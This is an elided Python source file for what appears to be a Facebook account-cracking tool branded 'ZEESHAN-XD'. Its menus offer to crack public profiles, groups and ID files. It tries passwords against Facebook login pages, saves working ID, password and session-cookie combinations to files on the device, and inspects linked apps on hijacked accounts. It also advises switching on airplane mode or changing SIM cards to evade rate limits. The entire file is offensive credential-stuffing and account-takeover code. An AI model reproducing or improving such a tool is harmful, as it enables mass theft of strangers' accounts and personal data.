...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m]] [\x1b[1;96 [MUHAMMAD-ZEESHAN]]')
...
def banner():
	clear()
	sol()
	cetak(nel('\t[bold cyan]• LIKE & FOLLOW MY FACEBOOK PAGE FOR NEW COMMANDS AND FB IDS • [/bold cyan]'))
	ban=''' 
...
\t[bold white]Owner:\t[bold yellow]Muhammad Zeeshan    \t[bold white] FB Page:\t[bold yellow]Zeeshan ツ
'''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             LOVE YOU : [green]HAPPY FOREVER[purple] '))
		...
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR INTERNET !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	cetak(nel('\t             WELCOME : [green]%s[blue]  (LOGIN USER)'%(my_name)))
	alvino_xy(f'{u}ID  : '+str(my_id))
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]              • CHOOSE CLONING MENU • [/bold cyan]'))
	print('')
	cetak(nel('[bold green] 1. CRACK PUBLIC\n 2. CRACK FOLLOWER[yellow] (Not Working)\n[green] 3. CRACK GROUP\n 4. CRACK FILE\n 5. CHECK RESULTS\n 0. EXIT [bold green]')) 
	_____cowok__ZEESHAN_____ = input('\n ➣CHOOSE : ')
	if _____cowok__ZEESHAN_____ in ['1']:
		dump_massal()
	elif _____cowok__ZEESHAN_____ in ['2']:
		dump_follower()
	elif _____cowok__ZEESHAN_____ in ['3']:
		error()
	elif _____cowok__ZEESHAN_____ in ['4']:
		crack_file()
	elif _____cowok__ZEESHAN_____ in ['5']:
		result()
	elif _____cowok__ZEESHAN_____ in ['0']:
...
def dump_massal():
	...
	try:
		...
		print(f'{u}')
		print('➣Your signal is weak ')
		back()
	except (KeyError,IOError):
		print(f'➣{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHERWISE CHECK YOUR ID LINK {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         • WHICH ACCOUNTS YOU WANT TO CLONE • [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]➣1. CLONE JUST OLD IDZ\n➣2. CLONE JUST NEW IDZ[bold red] (RECOMMENDED)\n[bold yellow]➣3. CLONE MIX IDZ (NEW/OLD)[bold red] (RECOMMENDED) [bold yellow]'))
	print('')
	hu = input('➣CHOOSE : ')
	if hu in ['1','01']:
	...
	print('') 
	cetak(nel('[bold red]➣1. MOBILE[bold yellow] (Highly Recommended)\n[bold red]➣2. MBASIC[bold yellow] (Recommended)\n[bold red]➣3. TOUCH\n➣4. MTOUCH [bold purple]')) 
	print('')
	hc = input('>> Enter : ')
	if hc in ['1','01']:
...
#	else:
#		taplikasi.append('no')
	pwplus=input('➣Add Password Manual/default(recommend)( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print(f'                    {m}G {k}O {h}O {u}O {b}D {u}  ★  {b}L {u}U {h} C{k} K{m} K{b}')
	print('')
	print(f'➣RESULTS {h}OK{u} Saved in : {h}OK/%s {b}'%(okc))
	print(f'➣RESULTS {k}CP{h} Saved in : {k}CP/%s {b}'%(cpc))
	print(f'➣Turn On Airplane Mode Every 1k {h}1k{u} Idz\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      🎀🤩 OK ID COMES ENJOY  🤩🎀[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      🤩OK ID COMES ENJOY 🤩[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='ZEESHAN-XD CP'))
					open('/sdcard/ZEESHAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='ZEESHAN-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ZEESHAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ZEESHAN-XD OK[/bold green]'))
					ok+=1
					break
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check Login In FB Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
...
def cek_opsi():
	c = len(akun)
	hu = 'There is %s Account To Check\Before Starting, Airplane Mode/Change Sim Card First'%(c)
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] ops there are no active apps on this account.")
	else:
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] ops there is no expired app on this account.")
	else:
		for i in range(len(game)):
